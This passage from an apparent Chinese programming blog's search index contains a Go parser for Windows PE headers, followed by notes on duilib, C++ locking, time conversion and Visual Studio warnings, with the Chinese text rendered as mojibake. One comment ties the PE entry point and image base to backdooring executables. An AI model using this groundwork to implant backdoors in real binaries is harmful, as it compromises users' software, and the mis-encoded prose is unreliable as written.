sizeoffsetä¸ºbufferï¼Œpe_sig_offsetæ˜¯è¯»å–çš„ä½ç½® è¿™é‡Œä¸åŠ :å¯ä»¥å—ï¼Ÿï¼Ÿ è¯»å–0x50 0x45 0x00 0x00 fmt.Println(&quot;[-----Signature Header-----]&quot;) fmt.Printf(&quot;[+] LFANEW Value: %s\\n&quot;, string(sizeOffset)) // Create the reader and read COFF Header sr := io.NewSectionReader(f, 0, 1&lt;&lt;63-1) // è¯»å–åˆ°2^64æ¬¡æ–¹-1 _, err = sr.Seek(pe_sig_offset+4, os.SEEK_SET) // é‡ç½®æŒ‡é’ˆ check(err) binary.Read(sr, binary.LittleEndian, &amp;pefile.FileHeader) // äºŒè¿›åˆ¶è¯»å– // Get size of OptionalHeader // å¯é€‰å¤´è§£æ å‘åŠ è½½ç¨‹åºæä¾›é‡è¦æ•°æ®ï¼ŒåŠ è½½ç¨‹åºå°†å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜ var sizeofOptionalHeader32 = uint16(binary.Size(pe.OptionalHeader32&#123;&#125;)) var sizeofOptionalHeader64 = uint16(binary.Size(pe.OptionalHeader64&#123;&#125;)) var oh32 pe.OptionalHeader32 var oh64 pe.OptionalHeader64 // type FileHeader struct &#123; // Machine uint16 // NumberOfSections uint16 // TimeDateStamp uint32 // PointerToSymbolTable uint32 // NumberOfSymbols uint32 // SizeOfOptionalHeader uint16 // Characteristics uint16 // &#125; // Read OptionalHeader switch pefile.FileHeader.SizeOfOptionalHeader &#123; case sizeofOptionalHeader32: binary.Read(sr, binary.LittleEndian, &amp;oh32) case sizeofOptionalHeader64: binary.Read(sr, binary.LittleEndian, &amp;oh64) &#125; // Print File Header fmt.Println(&quot;[-----COFF File Header-----]&quot;) fmt.Printf(&quot;[+] Machine Architecture: %#x\\n&quot;, pefile.FileHeader.Machine) fmt.Printf(&quot;[+] Number of Sections: %#x\\n&quot;, pefile.FileHeader.NumberOfSections) fmt.Printf(&quot;[+] Size of Optional Header: %#x\\n&quot;, pefile.FileHeader.SizeOfOptionalHeader) // Print section names fmt.Println(&quot;[-----Section Offsets-----]&quot;) fmt.Printf(&quot;[+] Number of Sections Field Offset: %#x\\n&quot;, pe_sig_offset+6) // this is the end of the Signature header (0x7c) + coff (20bytes) + oh32 (224bytes) fmt.Printf(&quot;[+] Section Table Offset: %#x\\n&quot;, pe_sig_offset+0xF8) // Print Optional Header fmt.Println(&quot;[-----Optional Header-----]&quot;) // å¦‚æœå¯¹peæ–‡ä»¶åŠ å…¥åé—¨ï¼Œéœ€è¦å¯¹ä¸‹é¢ä¸¤é¡¹æœ‰æ‰€äº†è§£ fmt.Printf(&quot;[+] Entry Point: %#x\\n&quot;, oh32.AddressOfEntryPoint) // ç›¸å¯¹äºimageBaseçš„å¯æ‰§è¡Œä»£ç ä½ç½® fmt.Printf(&quot;[+] ImageBase: %#x\\n&quot;, oh32.ImageBase) // å°†å›¾åƒåŠ è½½åˆ°å†…å­˜æ—¶ç¬¬ä¸€ä¸ªå­—èŠ‚ä½ç½® fmt.Printf(&quot;[+] Size of Image: %#x\\n&quot;, oh32.SizeOfImage) // å›¾åƒçš„å®é™…å¤§å° fmt.Printf(&quot;[+] Sections Alignment: %#x\\n&quot;, oh32.SectionAlignment) fmt.Printf(&quot;[+] File Alignment: %#x\\n&quot;, oh32.FileAlignment) fmt.Printf(&quot;[+] Characteristics: %#x\\n&quot;, pefile.FileHeader.Characteristics) fmt.Printf(&quot;[+] Size of Headers: %#x\\n&quot;, oh32.SizeOfHeaders) fmt.Printf(&quot;[+] Checksum: %#x\\n&quot;, oh32.CheckSum) fmt.Printf(&quot;[+] Machine: %#x\\n&quot;, pefile.FileHeader.Machine) fmt.Printf(&quot;[+] Subsystem: %#x\\n&quot;, oh32.Subsystem) fmt.Printf(&quot;[+] DLLCharacteristics: %#x\\n&quot;, oh32.DllCharacteristics) // Print Data Directory fmt.Println(&quot;[-----Data Directory----- æ•°æ®ç›®å½•è§£æï¼Œå¯é€‰å¤´çš„æœ€å128å­—èŠ‚]&quot;) var winnt_datadirs = []string&#123; &quot;IMAGE_DIRECTORY_ENTRY_EXPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_IMPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_RESOURCE&quot;, &quot;IMAGE_DIRECTORY_ENTRY_EXCEPTION&quot;, &quot;IMAGE_DIRECTORY_ENTRY_SECURITY&quot;, &quot;IMAGE_DIRECTORY_ENTRY_BASERELOC&quot;, &quot;IMAGE_DIRECTORY_ENTRY_DEBUG&quot;, &quot;IMAGE_DIRECTORY_ENTRY_COPYRIGHT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_GLOBALPTR&quot;, &quot;IMAGE_DIRECTORY_ENTRY_TLS&quot;, &quot;IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG&quot;, &quot;IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_IAT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT&quot;, &quot;IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR&quot;, &quot;IMAGE_NUMBEROF_DIRECTORY_ENTRIES&quot;, &#125; for idx, directory := range oh32.DataDirectory &#123; fmt.Printf(&quot;[!] Data Directory: %s\\n&quot;, winnt_datadirs[idx]) fmt.Printf(&quot;[+] Image Virtual Address: %#x\\n&quot;, directory.VirtualAddress) fmt.Printf(&quot;[+] Image Size: %#x\\n&quot;, directory.Size) &#125; fmt.Println(&quot;[-----Section Table----- è§£æåˆ†åŒºè¡¨]&quot;) // åŒ…å«äº†ç›¸å…³åˆ†åŒºçš„è¯¦ç»†ä¿¡æ¯ï¼Œä¸coff file headerä¸­numberofsections åŒ¹é… for _, section := range pefile.Sections &#123; fmt.Println(&quot;[+] --------------------&quot;) fmt.Printf(&quot;[+] Section Name: %s\\n&quot;, section.Name) fmt.Printf(&quot;[+] Section Characteristics: %#x\\n&quot;, section.Characteristics) fmt.Printf(&quot;[+] Section Virtual Size: %#x\\n&quot;, section.VirtualSize) fmt.Printf(&quot;[+] Section Virtual Offset: %#x\\n&quot;, section.VirtualAddress) fmt.Printf(&quot;[+] Section Raw Size: %#x\\n&quot;, section.Size) fmt.Printf(&quot;[+] Section Raw Offset to Data: %#x\\n&quot;, section.Offset) fmt.Printf(&quot;[+] Section Append Offset (Next Section): %#x\\n&quot;, section.Offset+section.Size) &#125; // s := pefile.Section(&quot;.text&quot;) // fmt.Printf(&quot;%v&quot;, *s) // &quot;Section Table Offset&quot; + (40bytes * number of sections)&#125;func check(e error) &#123; if e != nil &#123; log.Fatal(e) &#125;&#125;","tags":[{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"PEæ–‡ä»¶","slug":"PEæ–‡ä»¶","permalink":"https://hodlyounger.github.io/tags/PE%E6%96%87%E4%BB%B6/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"}]},{"title":"ã€duilibã€‘å…¥é—¨","date":"2023-10-27T01:24:02.113Z","path":"B_Code/Duilib/ã€duilibã€‘å…¥é—¨/","text":"[toc] å¼€å·æœ‰ç›Š ğŸˆgithubï¼š duilib/duilib ğŸ“–è¯´æ˜ï¼šDuilibæ˜¯ä¸€ä¸ªWindowsä¸‹å…è´¹å¼€æºçš„DirectUIç•Œé¢åº“ï¼Œç”±äºç®€çº¦æ˜“æ‰©å±•çš„è®¾è®¡ä»¥åŠç¨³å®šé«˜æ•ˆçš„å®ç°è¢«å„å¤§äº’è”ç½‘å…¬å¸æ™®éæ¥å—ï¼Œå¹¿æ³›åº”ç”¨äºåŒ…æ‹¬IMã€è§†é¢‘å®¢æˆ·ç«¯ã€è‚¡ç¥¨è¡Œæƒ…è½¯ä»¶ã€å¯¼èˆªè½¯ä»¶ã€æ‰‹æœºè¾…åŠ©è½¯ä»¶ã€å®‰å…¨è½¯ä»¶ç­‰å¤šä¸ªè¡Œä¸šçš„ä¼—å¤šPCå®¢æˆ·ç«¯è½¯ä»¶ã€‚Duilibè¿˜åœ¨ä¸æ–­çš„å‘å±•ä¸­ï¼Œåœ¨æ–‡æ¡£ã€ä¾‹å­ã€åŠ¨ç”»ã€æ¸²æŸ“å¼•æ“ç­‰å¤šä¸ªæ–¹é¢å°†æŒç»­æ”¹è¿›ã€‚ åŸºäºDuilibçš„è½¯ä»¶ä¸å®Œå…¨åˆ—è¡¨ Duilibè‡ª2010å¹´8æœˆ21æ—¥å‘å¸ƒä»¥æ¥ï¼Œè·å¾—äº†ä¼—å¤šå¼€å‘è€…å’Œå¤§å…¬å¸çš„ä¿¡èµ–ï¼Œåœ¨å„è¡Œå„ä¸šçš„è½¯ä»¶ä¸­å¾—åˆ°äº†å¹¿æ³›åº”ç”¨ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªä½œè€…çŸ¥é“ä¸å®Œå…¨åˆ—è¡¨ï¼Œæ¬¢è¿å¤§å®¶è¡¥å……æŒ‡æ­£ https://github.com/duilib/duilib/wiki/%E5%9F%BA%E4%BA%8EDuilib%E7%9A%84%E8%BD%AF%E4%BB%B6%E4%B8%8D%E5%AE%8C%E5%85%A8%E5%88%97%E8%A1%A8 ä¸‹é¢ä¸¤ä¸ªä¿®æ”¹ç‰ˆæœ¬å¤§å®¶å¯ä»¥å‚è€ƒä¸€ä¸‹ è…¾è®¯ä½¿ç”¨çš„çš„duilibä¿®æ”¹ç‰ˆ https://github.com/tencentyun/TIMSDK/tree/master/cross-platform/Windows/IMApp/Basic/duilib ç½‘æ˜“ä½¿ç”¨çš„duilibä¿®æ”¹ç‰ˆ https://github.com/netease-im/NIM_Duilib_Framework/tree/master/duilib å®‰è£… ä½¿ç”¨vcpkgåº“ç®¡ç†å™¨ä¸‹è½½å¹¶å®‰è£…duilib: 12345git clone https://github.com/Microsoft/vcpkg.gitcd vcpkg./bootstrap-vcpkg.sh./vcpkg integrate install./vcpkg install duilib","tags":[{"name":"duilib","slug":"duilib","permalink":"https://hodlyounger.github.io/tags/duilib/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Duilib","slug":"B-Code/Duilib","permalink":"https://hodlyounger.github.io/categories/B-Code/Duilib/"}]},{"title":"ã€CPPã€‘é”","date":"2023-10-27T01:24:02.112Z","path":"B_Code/CPP/ã€CPPã€‘é”/","text":"C++ é”çš„ä½¿ç”¨ 1. std æ ‡å‡†åº“ä¸­çš„é” STD æ ‡å‡†ä¸­çš„é”ã€‚ 123456789101112# å£°æ˜std::mutex handle_mutex;# ä½¿ç”¨1 äº’æ–¥é”std::lock_guard&lt;std::mutex&gt; lock(handle_mutex);# ä½¿ç”¨2 ç‹¬å é”std::unique_lock&lt;std::mutex&gt; lock(handle_mutex);# ä½¿ç”¨3 å…è®¸åŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡é”å®šåŒä¸€æŠŠé”ã€‚å¯¹äºé€’å½’å‡½æ•°å¯èƒ½éœ€è¦åœ¨åŒä¸€çº¿ç¨‹ä¸­å¤šæ¬¡è·å–é”çš„æƒ…å†µå¾ˆæœ‰ç”¨std::unique_lock&lt;std::recursive_mutex&gt; lock(handle_mutex); 1.1. å…±äº«é” å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å¾—å…±äº«é”ï¼Œå¯ä»¥å¹¶å‘çš„è¯»å–å…±äº«èµ„æº å…±äº«é”ä½¿ç”¨ std::shared_lock è·å– 12345678#include &lt;shared_mutex&gt;std::shared_mutex mySharedMutex;void readOperation() &#123; std::shared_lock&lt;std::shared_mutex&gt; lock(mySharedMutex); // è¯»å–å…±äº«èµ„æºçš„ä»£ç &#125; 1.2. ç‹¬å é” åªå…è®¸ä¸€ä¸ªçº¿ç¨‹å¯ä»¥è·å¾—ç‹¬å é”ï¼Œèƒ½å¤Ÿç‹¬å èµ„æº ç‹¬å é”ä½¿ç”¨ std::unqiue_lock è·å– 12345678#include &lt;shared_mutex&gt;std::shared_mutex mySharedMutex;void writeOperation() &#123; std::unique_lock&lt;std::shared_mutex&gt; lock(mySharedMutex); // ä¿®æ”¹å…±äº«èµ„æºçš„ä»£ç &#125; 2. Demo å¦‚ä¸‹æ‰€ç¤º ä½¿ç”¨ std::shared_lock è¿›è¡Œè¯»å–æ“ä½œï¼Œä½¿ç”¨ std::unique_lock è¿›è¡Œå†™å…¥æ“ä½œã€‚ é¿å…åœ¨å†™å…¥æ“ä½œä¸­ä½¿ç”¨å…±äº«é”ï¼Œä»¥å…ç ´åå†™è€…çš„äº’æ–¥æ€§ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;shared_mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;int sharedData=0;std::shared_mutex mySharedMutex;void readOperation(int id) &#123; //std::shared_lock&lt;std::shared_mutex&gt; lock(mySharedMutex); mySharedMutex.lock_shared();//æ‰‹åŠ¨æ§åˆ¶ // è¯»å–å…±äº«èµ„æºçš„ä»£ç  std::cout &lt;&lt; &quot;Reader &quot; &lt;&lt; id &lt;&lt; &quot; reading data: &quot; &lt;&lt; sharedData &lt;&lt; std::endl; mySharedMutex.unlock_shared();//æ‰‹åŠ¨æ§åˆ¶&#125;void writeOperation(int id) &#123; //std::unique_lock&lt;std::shared_mutex&gt; lock(mySharedMutex); mySharedMutex.lock();//æ‰‹åŠ¨æ§åˆ¶ // ä¿®æ”¹å…±äº«èµ„æºçš„ä»£ç  sharedData=id; std::cout &lt;&lt; &quot;Writer &quot; &lt;&lt; id &lt;&lt; &quot; writing data.&quot; &lt;&lt; std::endl; mySharedMutex.unlock();//æ‰‹åŠ¨æ§åˆ¶&#125;int main() &#123; std::vector&lt;std::thread&gt; readers; std::vector&lt;std::thread&gt; writers; for (int i = 0; i &lt; 5; ++i) &#123; readers.emplace_back(readOperation, i); writers.emplace_back(writeOperation, i); &#125; for (auto&amp; reader : readers) &#123; reader.join(); &#125; for (auto&amp; writer : writers) &#123; writer.join(); &#125; return 0;&#125; ä½¿ç”¨ Windows çš„ CComAutoCriticalSection 123456789101112131415161718class CAutoCriticalSection&#123;public: CAutoCriticalSection(CComAutoCriticalSection* lpSect) : m_pCS(lpSect) &#123; m_pCS-&gt;Lock(); &#125; ~CAutoCriticalSection() &#123; m_pCS-&gt;Unlock(); &#125;protected:private: CComAutoCriticalSection* m_pCS;&#125;; å¦‚ä½•ä½¿ç”¨ 12345# å£°æ˜CComAutoCriticalSection g_csLoginLock;# å®šä¹‰CAutoCriticalSection csLock(&amp;g_csLoginLock);","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"mutex","slug":"mutex","permalink":"https://hodlyounger.github.io/tags/mutex/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘â° æ—¶é—´å¤„ç†","date":"2023-10-27T01:24:02.111Z","path":"B_Code/CPP/ã€CPPã€‘æ—¶é—´å¤„ç†/","text":"Simple Demo 1234567891011#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;int main()&#123; time_t t; time(&amp;t); cout &lt;&lt; t &lt;&lt;endl; return 0;&#125; ä»¥ä¸Šä»£ç ä¼šè¾“å‡ºä¸€ä¸ª10ä½æ•°ï¼Œè¡¨ç¤ºçš„æ˜¯åˆ°å½“å‰æ—¶é—´çš„ç§’æ•°ï¼Œèµ·ç‚¹æ˜¯ 1970å¹´1æœˆ1æ—¥ 00:00:00 time_t è½¬æ¢ string è½¬ time_t 12345678910111213141516time_t StringToDatetime(std::string str)&#123; char *cha = (char*)str.data(); // å°†stringè½¬æ¢æˆchar*ã€‚ tm tm_; // å®šä¹‰tmç»“æ„ä½“ã€‚ int year, month, day, hour, minute, second;// å®šä¹‰æ—¶é—´çš„å„ä¸ªintä¸´æ—¶å˜é‡ã€‚ sscanf(cha, &quot;%d-%d-%d %d:%d:%d&quot;, &amp;year, &amp;month, &amp;day, &amp;hour, &amp;minute, &amp;second);// å°†stringå­˜å‚¨çš„æ—¥æœŸæ—¶é—´ï¼Œè½¬æ¢ä¸ºintä¸´æ—¶å˜é‡ã€‚ tm_.tm_year = year - 1900; // å¹´ï¼Œç”±äºtmç»“æ„ä½“å­˜å‚¨çš„æ˜¯ä»1900å¹´å¼€å§‹çš„æ—¶é—´ï¼Œæ‰€ä»¥tm_yearä¸ºintä¸´æ—¶å˜é‡å‡å»1900ã€‚ tm_.tm_mon = month - 1; // æœˆï¼Œç”±äºtmç»“æ„ä½“çš„æœˆä»½å­˜å‚¨èŒƒå›´ä¸º0-11ï¼Œæ‰€ä»¥tm_monä¸ºintä¸´æ—¶å˜é‡å‡å»1ã€‚ tm_.tm_mday = day; // æ—¥ã€‚ tm_.tm_hour = hour; // æ—¶ã€‚ tm_.tm_min = minute; // åˆ†ã€‚ tm_.tm_sec = second; // ç§’ã€‚ tm_.tm_isdst = 0; // éå¤ä»¤æ—¶ã€‚ time_t t_ = mktime(&amp;tm_); // å°†tmç»“æ„ä½“è½¬æ¢æˆtime_tæ ¼å¼ã€‚ return t_; // è¿”å›å€¼ã€‚&#125; time_t è½¬ string 123456789101112131415(1) time_t t=std::chrono::system_clock::to_time_t(std::chrono::system_clock::now()); std::stringstream ss; ss&lt;&lt;std::put_time(std::localtime(&amp;t),&quot;%F %X&quot;); ss.str();(2) size_t strftime (char* ptr, size_t maxsize, const char* format, const struct tm* timeptr ); ptr:å­˜å‚¨è½¬æ¢ç»“æœ maxsize:å¤åˆ¶åˆ°ptrçš„æœ€å¤§å­—ç¬¦æ•°ï¼ŒåŒ…æ‹¬ç»“æŸç¬¦&#x27;\\0&#x27; format:è½¬æ¢æ ¼å¼ï¼Œç±»ä¼¼printfï¼Œå¯åŠ å…¥å…¶ä»–éœ€è¦å¤åˆ¶è¿‡å»çš„å­—ç¬¦ timeptr:æ—¶é—´ char buf[20]; tm* local_time = std::localtime(&amp;t); strftime(buf,sizeof(buf),&quot;%F %X&quot;,local_time); C++æ—¶é—´ç±» ä½¿ç”¨C++æ—¶é—´ç±»å¤„ç†è·å–ç³»ç»Ÿå½“å‰æ—¶é—´ æ—¥æœŸå’Œæ—¶é—´å·¥å…· - C++ä¸­æ–‡ - APIå‚è€ƒæ–‡æ¡£ (apiref.com) å¤´æ–‡ä»¶ #include &lt;chrono&gt; è·å–å½“å‰æ—¶é—´ 1system_clock::time_point now = std::chrono::system_clock::now(); å°†å½“å‰æ—¶é—´è½¬æ¢ä¸ºtime_æ ¼å¼ 1time_t tt = std::chrono::system_clock::to_time_t(now); å°†time_æ ¼å¼çš„æ—¶é—´è½¬æ¢ä¸ºtm *æ ¼å¼ 1struct tm* tmNow = localtime(&amp;tt); å°†tm*æ ¼å¼çš„æ—¶é—´è½¬æ¢ä¸ºå¯è¯»çš„æ—¶é—´ 12char date[20] = &#123; 0 &#125;;sprintf(date, &quot;%d-%02d-%02d %02d:%02d:%02d&quot;,(int)tmNow-&gt;tm_year + 1900, (int)tmNow-&gt;tm_mon + 1, (int)tmNow-&gt;tm_mday, (int)tmNow-&gt;tm_hour, (int)tmNow-&gt;tm_min, (int)tmNow-&gt;tm_sec); æœ€åï¼Œåœ¨C++ä¸­çš„è¯å¯ä»¥å°†char*å­—ç¬¦ä¸²è½¬æ¢ä¸ºstd::stringå­—ç¬¦ä¸²æ¥å¤„ç† 1std::string timeNow(date);","tags":[{"name":"CPP/æ—¶é—´","slug":"CPP-æ—¶é—´","permalink":"https://hodlyounger.github.io/tags/CPP-%E6%97%B6%E9%97%B4/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€visual studioã€‘ç¼–è¯‘å‘Šè­¦å¸¸è§å¤„ç†æ‰‹æ®µ","date":"2023-10-27T01:24:02.111Z","path":"B_Code/CPP/ã€visual studioã€‘ç¼–è¯‘å‘Šè­¦å¸¸è§å¤„ç†æ‰‹æ®µ/","text":"[TOC] C2001 å¸¸é‡ä¸­æœ‰æ¢è¡Œç¬¦ æ–‡ä»¶ä¿å­˜ä¸º UTF-8 ç­¾å C4100 â€œ*â€ ç±»å‹æœªä½¿ç”¨ windows ä»£ç æ–‡ä»¶ä¸­ä½¿ç”¨ 1UNREFERENCED_PARAMETER(X) å¦‚æœæ˜¯åœ¨Qtä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ 1Q_UNUSED(X); å¦å¤–ï¼Œä¹Ÿä¸å»ºè®®ä½¿ç”¨ä¸Šè¿°ä¸¤ç§æ–¹å¼ã€‚å½“å®ç°æ¥å£æˆ–æ ‡å‡†å¯¼å‡ºå†…çš„æ–¹æ³•æ—¶ï¼Œæœ‰ä¸€äº›å‚æ•°æ²¡æœ‰è¢«å¼•ç”¨æ˜¯ç›¸å½“å¸¸è§çš„ã€‚ç¼–è¯‘å™¨ä¼šå‘ç°æœª ä½¿ç”¨çš„å‚æ•°ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªè­¦å‘Šï¼Œæœ‰äº›ç»„ä»¶ç”šè‡³ä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªé”™è¯¯ã€‚ä¸ºé¿å…å‘ç”Ÿå¦‚æ­¤æƒ…å†µï¼Œ å°†æœªä½¿ç”¨çš„å‚æ•°ä½¿ç”¨/* å‚æ•°å */ è¯­æ³•å°†å…¶æ³¨é‡Šæ‰ã€‚ä¸è¦ä½¿ç”¨ UNREFERENCED_PARAMETERï¼ˆï¼‰ å®ï¼Œå› ä¸ºå…¶ 1ï¼‰å¤ªç¹çï¼Œ2ï¼‰å¹¶ä¸èƒ½ä¿è¯å‚æ•°å®é™…ä¸ŠçœŸçš„æœªè¢«å¼•ç”¨ã€‚ æœ€å¥½çš„æ–¹æ³•å°±æ˜¯åœ¨å‡½æ•°æ¥å£ä¸­æ³¨é‡Šæ‰æœªä½¿ç”¨çš„å˜é‡ã€‚ 1LRESULT WndProcï¼ˆHWND hwnd, UINT uMsg, WPARAM wParam, LPARAM /* lParam */ï¼‰ C4805 æ“ä½œç±»å‹æ··åˆä¸å®‰å…¨ï¼šä¸€èˆ¬åœ¨æ“ä½œ bool å’Œ int æ—¶ä¼šè§¦å‘è¿™ä¸€è­¦å‘Š ç®€å•å¤„ç†å°±æ˜¯ä¸è¦ä½¿ç”¨è¿™ç§ä½œä¸ºåˆ¤æ–­çš„ä¾æ®ï¼Œè¦ä¹ˆç”¨ bool ç±»å‹ï¼Œè¦ä¹ˆç”¨ int ç±»å‹ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨å¼ºåˆ¶è½¬æ¢ã€‚ C4996 GetVersionExA è¢«å£°æ˜ä¸ºå·²å¦å†³ ç¢°è§è¿™ç§æƒ…å†µï¼Œéœ€è¦å…³é—­é¡¹ç›®çš„SDLæ£€æŸ¥ã€‚ 1Project Properties &gt; Configuration Properties &gt; C/C++ &gt; General &gt; SDL checkså…³æ‰ å…¶ä»– â€˜qsortâ€™ï¼šUse std::sort C5208 å‡ºç°è¿™ä¸ªé—®é¢˜çš„åŸå› æ˜¯ C é£æ ¼ä»£ç å’Œ C++ é£æ ¼ä»£ç æ··ç”¨å¯¼è‡´çš„ï¼Œç»“æ„ä½“åœ¨ C å’Œ C++ ä¸­æ˜¯ä¸ä¸€æ ·çš„ï¼š C 1234typedef struct&#123; char *yyy=new zzz[ttt];&#125;xxx; CPP 1234struct xxx &#123; char *yyy=new zzz[ttt];&#125;; å…·ä½“åŸå› æ˜¯ï¼šæœ€æ–°çš„C++20æ ‡å‡†ä¸­ï¼Œä¸ºäº†æ›´å¥½çš„å®ç°æ¨¡å—moduleçš„ç‰¹æ€§ï¼Œtypedef ä¸€ä¸ªæœªå‘½åçš„structè¢«é™åˆ¶ä¸ºåªèƒ½ä½¿ç”¨çº¯ç²¹çš„cè¯­è¨€è¯­æ³•ï¼Œå®ƒä¸èƒ½é€šè¿‡èµ‹å€¼è¿›è¡Œç±»å†…åˆå§‹åŒ–äº†ã€‚ æ‰€ä»¥ä¿®æ”¹çš„æ–¹æ¡ˆå°±æ˜¯ä¸è¦å£°æ˜åŒ¿åç»“æ„ä½“ï¼Œåœ¨å£°æ˜æ—¶åˆ›å»ºç»“æ„ä½“åã€‚ C6387 è­¦å‘Šå†…å®¹ï¼šâ€œ***â€å¯èƒ½æ˜¯0ï¼Œè¿™ä¸ç¬¦åˆå‡½æ•°â€œ****â€çš„è§„èŒƒã€‚ è¿™ä¸ªé—®é¢˜å°±æ˜¯å‡½æ•°å‚æ•°æ²¡æœ‰åšæ ¡éªŒï¼Œä¹Ÿå°±æ˜¯åˆ¤ç©ºç­‰æƒ…å†µï¼Œå¦‚ä¸‹æ‰€ç¤ºä»£ç å°±ä¼šå‡ºç°è¯¥è­¦å‘Šï¼š 123456789101112131415m_hMutex = CreateMutex(NULL, TRUE, this-&gt;MutexName);if (GetLastError() == ERROR_ALREADY_EXISTS)&#123; if (WaitForSingleObject(m_hMutex, INFINITE) == WAIT_OBJECT_0) &#123; Unlock(m_hMutex); return FALSE; &#125; else &#123; g_hMutex = m_hMutex; MutexReleased = FALSE; return TRUE; &#125;&#125; ä¿®æ”¹ä¸ºå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718m_hMutex = CreateMutex(NULL, TRUE, this-&gt;MutexName);if (GetLastError() == ERROR_ALREADY_EXISTS)&#123; if (m_hMutex != NULL) // æ·»åŠ åˆ¤ç©ºé€»è¾‘ &#123; if (WaitForSingleObject(m_hMutex, INFINITE) == WAIT_OBJECT_0) &#123; Unlock(m_hMutex); return FALSE; &#125; else &#123; g_hMutex = m_hMutex; MutexReleased = FALSE; return TRUE; &#125; &#125;&#125; LNK4098 LINK : warning LNK4098: é»˜è®¤åº“â€œLIBCMTâ€ä¸å…¶ä»–åº“çš„ä½¿ç”¨å†²çªï¼›è¯·ä½¿ç”¨ /NODEFAULTLIB:library ç®€å•å¤„ç†å°±æ˜¯åœ¨VSé¡¹ç›®å±æ€§ -&gt; é“¾æ¥å™¨ -&gt; å‘½ä»¤è¡Œ ä¸­æ·»åŠ ä¸Šè¿°æç¤ºçš„å†…å®¹ã€‚ä»¥ LIBCMT åº“ä¸ºä¾‹ï¼šæ·»åŠ å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 1/NODEFAULTLIB:LIBCMT LNK4099 warning LNK4099: æœªæ‰¾åˆ° PDBâ€œcryptlib.pdbâ€(ä½¿ç”¨â€œcryptlib.lib(cryptlib.obj) ä¸€èˆ¬è¿™ç§æƒ…å†µå±äºä½¿ç”¨äº†å¼€æºåº“ç¼–è¯‘çš„libï¼Œåœ¨é¡¹ç›®ä¸­ä½¿ç”¨æ—¶ï¼Œè°ƒè¯•ä¿¡æ¯æ ¼å¼é€‰æ‹©äº† /zi é€‰é¡¹ã€‚å› æ­¤ä¼šæç¤ºæ²¡æœ‰ obj æ–‡ä»¶ã€‚ è§£å†³åŠæ³•å°±æ˜¯ç¨‹åºè°ƒè¯•ä¿¡æ¯é€‰æ‹©æ— å³å¯ã€‚å¦å¤–å°±æ˜¯æˆ‘ä»¬ç¼–è¯‘è¿‡ç¨‹ä¸­å¦‚æœéœ€è¦è°ƒè¯•ä¿¡æ¯æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯pdbè¯¥æ€ä¹ˆåŒæ—¶å¤„ç†è¿™ä¸¤ä¸ªé—®é¢˜ï¼š","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"},{"name":"windows/visual-studio","slug":"windows-visual-studio","permalink":"https://hodlyounger.github.io/tags/windows-visual-studio/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘æ–‡ä»¶åç¼€æ ¡éªŒ","date":"2023-10-27T01:24:02.110Z","path":"B_Code/CPP/ã€CPPã€‘æ–‡ä»¶åç¼€æ ¡éªŒ/","text":"123456789101112#include &lt;iostream&gt;#include &lt;string&gt;int main()&#123; std::string fn = &quot;filename.conf&quot;; if(fn.substr(fn.find_last_of(&quot;.&quot;) + 1) == &quot;conf&quot;) &#123; std::cout &lt;&lt; &quot;Yes...&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No...&quot; &lt;&lt; std::endl; &#125;&#125;","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘å„ç§å®å®šä¹‰ç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:02.109Z","path":"B_Code/CPP/ã€CPPã€‘å®å®šä¹‰/","text":"Cè¯­è¨€ASCIIå­—ç¬¦ã€16è¿›åˆ¶å’ŒBCDç å€¼äº’è½¬ï¼Œå„ç§å¥½ç”¨çš„å®å®šä¹‰å–å€¼ 